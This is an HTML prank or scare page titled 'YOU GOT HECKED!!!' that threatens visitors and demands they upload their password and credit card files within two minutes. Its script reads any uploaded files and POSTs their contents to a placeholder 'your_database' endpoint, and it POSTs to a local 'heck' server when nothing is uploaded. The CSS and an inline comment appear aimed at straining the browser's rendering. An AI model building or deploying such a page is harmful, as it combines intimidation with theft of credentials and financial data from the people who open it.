<html>
  <head>
    <title>
      YOU GOT HECKED!!!
    </title>
    <style>
      body {
        background-image: url('./background.jpeg');
        color: white;
        font-family: Courier New;
        font-weight: bold;
                * {
            box-shadow: 5px 5px 20px rgba(0,0,0,0.3), -5px -5px 20px rgba(0,0,0,0.2);
            display: flex;
            flex-direction: column;
            margin: 2px;
            padding: 2px;
            will-change: transform;
            transform: translateZ(0);
        }
        body div + div ~ div > div:nth-child(odd) {
            border: 1px solid rgba(255, 0, 0, 0.5);
            background: rgba(0, 0, 0, 0.05);
        }
      }
      button {
        background-color: red;
        color: white;
        font-family: Arial;
        font-size: 25pt;
      }
      input {
        background-color: black;
        color: white;
        font-family: Courier New;
        font-weight: bold;
      }
      h1 {
        font-size: 25pt;
      }
    </style>
  </head>
  <body align='center'>
    <h1>YOU GOT HECKED!!!</h1>
    <img id='img' src='./hecker.png' width='250' height='140'>
    <div id='section'>
      <p>You have two minutes to input your password and credit card number files.</p>
      <p>If files are not inputted within two minutes then you'll get hecked.</p>
      <p>
        <input type='file' id='input' multiple>
      </p>
      <p>
        <button>SUBMIT</button>
      </p>
    </div>
    <div>
        <div>
            <div>
                <div>
                    <div>
                        <p> HACKER OLVERLOAD HEHEHEHE E</p>
                        <!-- Inline SVGs are incredibly heavy for Chromium to draw repeatedly -->
                        <svg width="50" height="50"><circle cx="25" cy="25" r="20" fill="red" filter="blur(5px)" /></svg>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
      let section = document.getElementById('section');
      let cller = document.getElementById('img');
      async function convertFile(file) {
        return new Promise(function(resolve, reject) {
          let reader = new FileReader();
          reader.readAsDataURL(file);
          reader.onload = function() { resolve(reader.result) };
          reader.onerror = function(e) { reject("Error, and don't care.") };
        });
      }
      document.querySelector('button').addEventListener('click', async function() {
        let input = document.getElementById('input');
        if (input.files.length === 0) {
          section.innerHTML = `
          <p>No files? I would've let you go, but I guess not...</p>
          `;
          setTimeout(async function() {
            section.innerHTML = `
            <p>GET HECKED!!!</p>
            `;
            await fetch("http://localhost:3000/heck", {
              method : "POST",
              "headers" : {
                "Content-Type" : "text/plain"
              },
              body : undefined
            });
          }, 2000);
        } else {
          let files = [];
          for (let file of input.files) {
            files.push(await convertFile(file));
          }
          await fetch("your_database", {
            method : "POST",
            headers: {
              "Content-Type" : "application/json"
            },
            body : JSON.stringify(files)
          });
        }
      });
    </script>
  </body>
</html>
